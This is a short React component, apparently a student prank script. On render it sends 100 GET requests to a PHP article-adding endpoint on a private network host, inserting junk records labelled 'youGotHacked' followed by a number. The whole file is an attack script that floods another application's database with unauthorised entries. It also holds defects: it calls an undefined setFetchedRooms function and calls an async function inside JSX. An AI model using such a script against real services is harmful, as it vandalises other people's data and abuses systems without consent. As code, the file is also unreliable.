function Test() {
  const hack = async () => {
    for (let i = 0; i < 100; i++) {
      try {
        const response = await fetch(
          `http://10.30.5.237/PHP/Tp3/Ex2/Control/ControlArticle.php?ref=youGotHacked${i}&lib=sadasd&frs%5B%5D=1&pv%5B%5D=Point1&prix=69&qtit=69&add=ADD`
        );
        // console.log(
        //   `http://HSF002LINUX/Web2/Project/api.php/Rooms?${queryParams}`
        // );
        const data = await response.json();
        // console.log(data);
        console.log("added" + i);
        setFetchedRooms(data);
      } catch (error) {
        console.log("error" + i);
        // Handle any errors
      }
    }
  };
  return <>{true && hack()}</>;
}

export default Test;
